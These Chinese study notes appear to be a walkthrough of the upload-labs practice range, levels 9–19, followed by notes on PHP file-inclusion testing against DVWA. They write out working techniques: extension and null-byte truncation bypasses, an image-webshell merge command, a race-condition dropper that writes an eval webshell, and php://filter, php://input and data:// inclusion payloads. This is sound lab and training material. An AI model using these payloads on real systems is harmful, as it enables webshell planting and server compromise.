![img](03 文件上传靶场笔记.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F1dXV1dXV1dQ==,size_16,color_FFFFFF,t_70.png)

依然是黑名单校验加文件名处理

这里就利用上一关的第二种方式绕过

![img](03 文件上传靶场笔记.assets/20181110150423231.png)

成功

![img](03 文件上传靶场笔记.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F1dXV1dXV1dQ==,size_16,color_FFFFFF,t_70.png)

 

第十关

查看提示

![img](03 文件上传靶场笔记.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F1dXV1dXV1dQ==,size_16,color_FFFFFF,t_70.png)

会去除脚本后缀，可以通过双写绕过

![img](03 文件上传靶场笔记.assets/2018111015082974.png)

可以看到保存为10.php

![img](03 文件上传靶场笔记.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F1dXV1dXV1dQ==,size_16,color_FFFFFF,t_70.png)

 

第十一关

查看提示

![img](03 文件上传靶场笔记.assets/20181110151036332.png)

抓包

![img](03 文件上传靶场笔记.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F1dXV1dXV1dQ==,size_16,color_FFFFFF,t_70.png)

补充点知识：

截断条件： php版本**小于5.3.4**  大于此版本的修复了

php的**magic_quotes_gpc**为**OFF状态** 这函数是魔术引号，会对敏感的字符转义的 空就会被转义加个反斜杠

因为我们是集成包，所以环境一切都是完美的~~~

 

利用截断，构造路径  文件名就会被截断啦。

![img](03 文件上传靶场笔记.assets/20181110151525654.png)

成功

![img](03 文件上传靶场笔记.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F1dXV1dXV1dQ==,size_16,color_FFFFFF,t_70.png)

 

第十二关

查看提示

![img](03 文件上传靶场笔记.assets/20181110152324551.png)

老样子，抓包修改

![img](03 文件上传靶场笔记.assets/20181110152513952.png)

提交方式不一样而已 构造0x00截断 这里在16进制改加个分号方便查找进行修改

![img](03 文件上传靶场笔记.assets/20181110152731547.png)

![img](03 文件上传靶场笔记.assets/20181110152834709.png)

成功

![img](03 文件上传靶场笔记.assets/20181110152905214.png)

 

第十三关

![img](03 文件上传靶场笔记.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F1dXV1dXV1dQ==,size_16,color_FFFFFF,t_70.png)

只需将图片马上传即可，后期可以利用文件包含漏洞实现getshell

查看提示

![img](03 文件上传靶场笔记.assets/20181110153212132.png)

这里进行了上传文件头检测

我们在我们的上传文件 加入jpg，png，gif的文件头

![img](03 文件上传靶场笔记.assets/20181110153508533.png)

这里是16进制 可以用winhex进行查看修改     或者直接构造图片马（下一题）

提交

![img](03 文件上传靶场笔记.assets/2018111015481294.png)

等效16进制

![img](03 文件上传靶场笔记.assets/20181110154922619.png)

成功，文件已经重命名

![img](03 文件上传靶场笔记.assets/20181110155137400.png)

\- - 偷偷懒就不写jpg和png了

 

第十四关

查看提示

![img](03 文件上传靶场笔记.assets/20181110155556797.png)

getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息，我们在图片中插入一句话并且可以正常显示图片绕过此函数。

构造图片马

准备一张正常的图，和一句话木马 在命令行

copy 1.jpg /b + 1.php  14.jpg         

参数/b指定以二进制格式复制、合并文件; 用于图像类/声音类文件 

意思是将1.jpg以二进制与1.php合并成14.jpg 14.jpg就是图片马 记事本方式打开一句话木马被插在最后

![img](03 文件上传靶场笔记.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F1dXV1dXV1dQ==,size_16,color_FFFFFF,t_70.png)

上传

![img](03 文件上传靶场笔记.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F1dXV1dXV1dQ==,size_16,color_FFFFFF,t_70.png)

\- - 然后就失败了，我试了试正常的jpg图片也不行。png和gif的通过

![img](03 文件上传靶场笔记.assets/201811101617212.png)

 

第十五关

查看提示

![img](03 文件上传靶场笔记.assets/20181110161820288.png)

这一关拿上一次生成的jpg马就可以上传~  

![img](03 文件上传靶场笔记.assets/20181110162013870.png)

第十六关

查看提示

![img](03 文件上传靶场笔记.assets/20181110162848413.png)

查看源代码

![img](03 文件上传靶场笔记.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F1dXV1dXV1dQ==,size_16,color_FFFFFF,t_70.png)- 

二次渲染- - 

根据用户上传的图片，生成一个新的图片，然后删除用户上传的原始图片，将新图片存储到数据库中。

从其他writeup找的过渲染的图片马（强）

![img](03 文件上传靶场笔记.assets/20181110165916273.gif)和这个损坏的jpg![img](03 文件上传靶场笔记.assets/20181110170000944.jpg)警告提示报错，但是依旧成功上传，并且没有重命名。

![img](03 文件上传靶场笔记.assets/20181110170404557.png)

\- - 自己想了不少姿势，想打组合拳，都没有bypass。

 

第十七关

查看提示

![img](03 文件上传靶场笔记.assets/2018111017103997.png)

![img](03 文件上传靶场笔记.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F1dXV1dXV1dQ==,size_16,color_FFFFFF,t_70-1642397831641105)

上传php文件会被删除 利用条件竞争漏洞，不断请求资源，在删除文件之间请求该文件。

```html
<?php fputs(fopen('../shell.php','w'),'<?php @eval($_POST[aaa]) ?>'); ?>
```

本地没有复现成功- - ， 然后用第五关的姿势也是得到了getshell

 

第十八关

代码审计

参考别人的writeup（待补充原理~）   利用上传重命名竞争+Apache解析漏洞 不断发包

![img](03 文件上传靶场笔记.assets/20181110174607221.png)

可用菜刀直接连接

 

第十九关

查看提示

![img](03 文件上传靶场笔记.assets/2018111017530776.png)

CVE-2015-2348

move_uploaded_file() 00截断，上传webshell，同时自定义保存名称，直接保存为php是不行的 
 发现move_uploaded_file()函数中的img_path是由post参数save_name控制的，因此可以在save_name利用00截断绕过： 


构造

![img](03 文件上传靶场笔记.assets/20181110180207252.png)

或者

![img](03 文件上传靶场笔记.assets/20181110180036908.png)

均可绕过

 

复现了听过没实际操作过或者没了解过的姿势。同一关卡可以有不同姿势，也是有待研究和补充的。

 

 

 

参考链接：[github.com/LandGrey/upload-labs-writeup](https://github.com/LandGrey/upload-labs-writeup)    





# 文件包含



触发条件：配置文件php.ini文件中有：

```
allow_url_include=On
```

的状态

才允许文件包含



【脚本语言是从上到下执行的，边编译边执行】



## 基本代码

例如：

php文件——

test1.php【include文件包含的基本代码】

```
<?php

$file = $_GET['file'];
include($file);

?>
```

wj1.php

```
i am wenjian1 php
```

![image-20220118094934729](04 文件包含漏洞补充.assets/image-20220118094934729.png)

看到传参后就可以进入某个文件。



常用于qq空间皮肤等



## 测试

1. 允许远程文件包含：

```
http://dvwa.com/vulnerabilities/fi/?page=
http://www.baidu.com
```



![image-20220118095226841](04 文件包含漏洞补充.assets/image-20220118095226841.png)

发现可以包含：

![image-20220118095314229](04 文件包含漏洞补充.assets/image-20220118095314229.png)





2. 允许使用file协议包含本地文件

```
http://dvwa.com/vulnerabilities/fi/?page=
file:///c:/a.txt
```



![image-20220118095447989](04 文件包含漏洞补充.assets/image-20220118095447989.png)



### 小知识——伪协议

##### file://   访问本地文件系统

##### http://   访问http网址

##### ftp://   访问ftp服务器

##### php://   访问输入输出流

##### zlib://   访问压缩流

##### data://   访问数据流

##### phar://   php归档

##### rar://   访问rar文件

##### ogg://   访问音频

##### expect://   交互式流

【远程访问】



3. **利用php输入输出流伪协议**

```
?page=
php://filter/read=convert.base64-encode/resource=./文件.php

php://filter/read=convert.base64-encode/resource=./index.php
```

![image-20220118095913539](04 文件包含漏洞补充.assets/image-20220118095913539.png)

解码后就可以得到源代码：

![image-20220118100014517](04 文件包含漏洞补充.assets/image-20220118100014517.png)

即：

![image-20220118100053276](04 文件包含漏洞补充.assets/image-20220118100053276.png)



4. **利用php输入输出流伪协议**,php://input,通过post提交php的数据让它执行

```
?page=
php://input

POST
<?php phpinfo() ?>
```



![image-20220118100228284](04 文件包含漏洞补充.assets/image-20220118100228284.png)



5. **利用php输入输出流伪协议**,data,通过post提交php的数据让它执行

```
?page=
data://text/plain,<?php phpinfo() ?>

?page=
data://text/plain;base64,[<?php phpinfo() ?>的base64加密PD9waHAgcGhwaW5mbygpPz4=]
```





